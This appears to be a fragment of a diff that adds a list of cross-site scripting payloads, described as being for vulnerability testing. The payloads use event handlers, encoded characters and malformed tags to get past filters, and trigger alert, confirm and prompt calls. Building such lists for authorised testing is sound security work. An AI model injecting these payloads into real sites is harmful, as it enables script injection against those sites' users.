+  - <img/src=`%00` onerror=this.onerror=confirm(1)
+  - <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+  - <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+  - </plaintext\></|\><plaintext/onmouseover=prompt(1)
+  - <blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver
+  - <var onmouseover="prompt(1)">On Mouse Over</var>
+  - <iframe/onreadystatechange=alert(1)
+  - <script>+-+-1-+-+alert(1)</script>
+  - <img src ?itworksonchrome?\/onerror = alert(1)
+  - <script itworksinallbrowsers>/*<script* */alert(1)</script
+  description: XSS payloads for vulnerability testing. The default payload is the
+    proven one from obb.py.
